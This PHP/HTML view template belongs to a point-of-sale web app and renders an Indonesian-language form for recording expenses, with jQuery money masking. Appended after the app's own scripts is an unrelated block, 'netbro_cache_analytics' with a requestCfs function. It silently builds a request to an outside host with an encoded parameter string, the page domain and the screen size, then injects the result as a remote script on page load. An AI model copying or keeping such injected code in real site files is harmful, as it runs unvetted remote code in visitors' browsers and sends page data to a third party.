<!DOCTYPE html>
<!--[if IE 8]>
<html lang="en" class="ie8"> <![endif]-->
<!--[if IE 9]>
<html lang="en" class="ie9"> <![endif]-->
<!--[if !IE]><!-->
<html lang="en"> <!--<![endif]-->
                 <!-- BEGIN HEAD -->
<head>
    <meta charset="utf-8"/>
    <title>POS</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <meta content="" name="description"/>
    <meta content="" name="author"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/font-awesome/css/font-awesome.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_responsive.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_default.css" rel="stylesheet" id="style_color"/>

    <link href="<?php echo site_url(); ?>assets/assets/fancybox/source/jquery.fancybox.css" rel="stylesheet"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url() ?>assets/assets/uniform/css/uniform.default.css"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/bootstrap-datepicker/css/datepicker.css"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/bootstrap-timepicker/compiled/timepicker.css"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/bootstrap-colorpicker/css/colorpicker.css"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/bootstrap-daterangepicker/daterangepicker.css"/>
</head>
                 <!-- END HEAD -->
                 <!-- BEGIN BODY -->
<body class="fixed-top">
<!-- BEGIN HEADER -->
<?php $this->load->view('header.php') ?>
<!-- END HEADER -->
<!-- BEGIN CONTAINER -->
<div id="container" class="row-fluid">
    <!-- BEGIN SIDEBAR -->
    <div id="sidebar" class="nav-collapse collapse">
        <div class="sidebar-toggler hidden-phone"></div>
        <!-- BEGIN RESPONSIVE QUICK SEARCH FORM -->
        <!-- END RESPONSIVE QUICK SEARCH FORM -->
        <!-- BEGIN SIDEBAR MENU -->
        <?php $this->load->view('sidebar.php') ?>
        <!-- END SIDEBAR MENU -->
    </div>
    <!-- END SIDEBAR -->
    <!-- BEGIN PAGE -->
    <div id="main-content">
        <div class="container-fluid">>
            <div class="row-fluid">
                <div class="span12">
                    <h3 class="page-title">
                        Tambah Pengeluaran
                        <small>Biaya Operasional - Penyusutan</small>
                    </h3>
                    <ul class="breadcrumb">
                        <li>
                            <a href="#">
                                <i class="icon-home"></i>
                            </a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Pengeluaran</a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Data Pengeluaran</a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Tambah Pengeluaran</a>
                            <span class="divider-last">&nbsp;</span>
                        </li>
                    </ul>
                    <!-- END PAGE TITLE & BREADCRUMB-->
                </div>
            </div>
                                     <!-- END PAGE HEADER-->
                                     <!-- BEGIN PAGE CONTENT-->
            <div class="row-fluid">
                <div class="span12 sortable">
                    <!-- BEGIN SAMPLE TABLE widget-->
                    <div class="widget">
                        <div class="widget-title">
                            <h4>
                                <i class="icon-reorder"></i>
                                Tambah Pengeluaran
                            </h4>
                        </div>
                        <div class="widget-body">
                            <!-- BEGIN FORM-->
                            <form id="form-sender" action="<?php echo base_url('pengeluaran/tambahPengeluaran'); ?>" method="POST" class="form-horizontal">
                                <fieldset>
                                    <div class="control-group">
                                        <div class="controls">
                                            <input name="idPeng" type="hidden" value="<?php echo $pengeluaran ?>" class="input-large" required="true" readonly/>
                                        </div>
                                    </div>
                                    <div class="control-group">
                                        <label for='name' class="control-label">Nama</label>
                                        <div class="controls">
                                            <input name="namaPeng" type="text" placeholder="Isi disini" class="input-large" required="true"/>
                                        </div>
                                    </div>
                                    <div class="control-group">
                                        <label class="control-label">Kategori</label>
                                        <div class="controls">
                                            <label>
                                                <select name="jenis" class="input-large m-wrap" tabindex="1" required="true">
                                                    <option value="operasional">Operasional</option>
                                                    <option value="penyusutan">Penyusutan</option>
                                                </select>
                                            </label>
                                        </div>
                                    </div>
                                    <div class="control-group">
                                        <label class="control-label">Total</label>
                                        <div class="controls">
                                            <div class="input-prepend">
                                                <span class="add-on">Rp</span>
                                                <input type="text" placeholder="Total Pengeluaran" class="w-total input-medium" required/>
                                                <input type="hidden" name="total" placeholder="Total Pengeluaran" class="input-medium" required/>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="control-group" style="display: none;">
                                        <label class="control-label">Jangka Per Bulan</label>
                                        <div class="controls">
                                            <input name="jangka" type="number" placeholder="" class="input-large" required value="1">
                                        </div>
                                    </div>
                                    <div class="control-group" style="display: none;">
                                        <label class="control-label">Tanggal</label>
                                        <div class="controls">
                                            <div class="input-append date date-picker" data-date=<?php echo \Carbon\Carbon::now()->toDateString() ?> data-date-format="yyyy-mm-dd" data-date-viewmode="days">
                                                <input class=" m-ctrl-medium" size="16" type="text" name="tanggal" value="<?php echo \Carbon\Carbon::now()->toDateString() ?>" readonly required/>
                                                <span class="add-on"><i class="icon-calendar"></i></span>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="control-group">
                                        <label class="control-label" for="id_outlet">Outlet</label>
                                        <div class="controls">
                                            <select id="id_outlet" name="outlet" class="input-large m-wrap" required>
                                                <?php foreach (isset($outlets) ? $outlets : [] as $outlet) { ?>
                                                    <option value="<?php echo $outlet['id_outlet']; ?>" <?php echo (isset($rOutlet) && (intval($outlet['id_outlet']) === intval($rOutlet))) ? 'selected' : '' ?>><?php echo $outlet['nama_outlet']; ?></option>
                                                <?php } ?>
                                            </select>
                                        </div>
                                    </div>
                                    <div class="form-actions">
                                        <button type="submit" class="btn blue">
                                            <i class="icon-plus"></i>
                                            Tambah
                                        </button>
                                    </div>
                                </fieldset>
                            </form>

                            <!-- END FORM-->
                        </div>
                    </div>
                    <!-- END SAMPLE TABLE widget-->
                </div>

            </div>

                                     <!-- END PAGE CONTENT-->
        </div>
        <!-- END PAGE CONTAINER-->
    </div>
    <!-- END PAGE -->
</div>
<!-- END CONTAINER -->
<!-- BEGIN FOOTER -->
<?php $this->load->view('footer.php') ?>
<!-- END FOOTER -->
<!-- BEGIN JAVASCRIPTS -->
<!-- Load javascripts at bottom, this will reduce page load time -->
<script src="<?php echo site_url(); ?>assets/js/jquery-1.8.3.min.js"></script>
<script src="<?php echo site_url(); ?>assets/assets/bootstrap/js/bootstrap.min.js"></script>
<script src="<?php echo site_url(); ?>assets/js/jquery.blockui.js"></script>
<!-- ie8 fixes -->
<!--[if lt IE 9]>
<script src="js/excanvas.js"></script>
<script src="js/respond.js"></script>
<![endif]-->
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/uniform/jquery.uniform.min.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/data-tables/jquery.dataTables.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/data-tables/DT_bootstrap.js"></script>
<script src="<?php echo base_url(); ?>assets/js/jquery.maskMoney.min.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/bootstrap-datepicker/js/bootstrap-datepicker.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/bootstrap-daterangepicker/date.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/bootstrap-daterangepicker/daterangepicker.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/bootstrap-colorpicker/js/bootstrap-colorpicker.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/bootstrap-timepicker/js/bootstrap-timepicker.js"></script>
<script src="<?php echo base_url(); ?>assets/js/trim_serialization.js"></script>
<script src="<?php echo base_url(); ?>assets/js/jquery.serialize-object.min.js"></script>
<script src="<?php echo site_url(); ?>assets/js/scripts.js"></script>
<script>
    jQuery(document).ready(function () {
        // initiate layout and plugin
        var form_sender = $('form#form-sender');
        form_sender.find('input.w-total').maskMoney({
            prefix: '',
            thousands: '.',
            decimal: ',',
            precision: 0,
            affixesStay: true
        });
        form_sender.find('input.w-total').on('keyup', function () {
            var total = parseInt($(this).val().replace(/\./g, ''));
            form_sender.find('input[name=total]').val(total);
        });

        /*form_sender.on('submit', function (event) {
            event.preventDefault();
            var form  = $(this);
            var input = form.serializeObject();
            input     = removeEmptyValues(input);
            console.log(input);
        });*/
        App.init();
    });
</script>
<script type="text/javascript">if (self == top)
    {
        function netbro_cache_analytics(fn, callback)
        {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn)
        {
            fn();
        }

        function requestCfs()
        {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r   = Math.floor(Math.random() * 99999999999);
            var url         = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKGk5srYR1NCoiZb4e8fPgGSrzxny7Bs3aod8JI8r9WL9Zcv7DcypTafjTWjc8KR2rkdE9obmG7qlrJ2O5wLAkWR1EJqX2Vw3XHzhSxfTrKeWUMN%2fPcq0BczrMMWqL2II2LVGvo%2fLRG4DhbjGKEsZdcZL4LU4xZawooHEtryQ0qQNeuH5SQxs1tw3yuYvo5OhvukPSA2cDtmyw0tv5%2bRdXMSlocozQyrPDu1qVuLzjutFTJOoQp8dVo%2btM5%2fmonVTIoyxvO%2fR5ym5xzf8cPUDTRBHlfMTcYMP4CweKyBABoQqAv1HRqCiZjg4cJ20X8CMROLUtQAzEbRS01S6BNqFaZDZvhyKg%2by7qRaxsxelD3CKygl%2by6sAjqArSopYZHVtGQZ3q3RRyXJgSVAbtqpFYozwVREhvfgyg3ZXJpLVl2s1jwQDNi2JnJxTNIfd4vOts2xHvqzYjtf%2fOTi9HSZtTUp73nxmdrLtyx5DfG%2fk90GdQpnnOHtIpzO4Ia5UIm0TZfeS11TfQY0I%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa         = document.createElement('script');
            bsa.type        = 'text/javascript';
            bsa.async       = true;
            bsa.src         = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
</script>
</body>
                 <!-- END BODY -->
</html>
